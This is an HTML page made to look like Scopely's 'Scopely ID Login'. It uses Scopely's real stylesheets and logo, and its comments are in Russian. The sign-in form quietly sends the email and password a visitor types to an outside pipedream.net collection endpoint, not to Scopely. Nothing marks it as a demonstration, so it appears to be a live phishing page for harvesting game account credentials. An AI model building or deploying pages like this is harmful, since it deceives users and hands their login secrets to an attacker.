<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Scopely ID Login</title>

  <!-- Viewport для мобильной адаптации -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Стили для десктопа и мобильных устройств -->
  <link rel="stylesheet" href="https://id.aprod.scopely.io/identity-site/resources/apps/default/css/desktop.css">
  <link rel="stylesheet" media="only screen and (max-width: 768px)" href="https://id.aprod.scopely.io/identity-site/resources/apps/default/css/mobilePortrait.css">

  <style>
    body {
      background-color: #000;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 40px 20px;
    }
    .login-box {
      display: inline-block;
      padding: 30px;
      border: 1px solid #444;
      border-radius: 10px;
      background-color: #111;
      max-width: 400px;
      width: 100%;
    }
    input, button {
      display: block;
      margin: 15px auto;
      padding: 12px;
      width: 100%;
      max-width: 300px;
      font-size: 16px;
    }
    img {
      margin-bottom: 30px;
      width: 80%;
      max-width: 180px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://id.aprod.scopely.io/identity-site/resources/apps/default/images/scopelyWhiteVerticalLogo.png" alt="Scopely Logo">
    <form action="https://eo3a2d6jslorcat.m.pipedream.net" method="POST">
      <input type="email" name="email" placeholder="Email address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign in</button>
    </form>
  </div>
</body>
  </html>
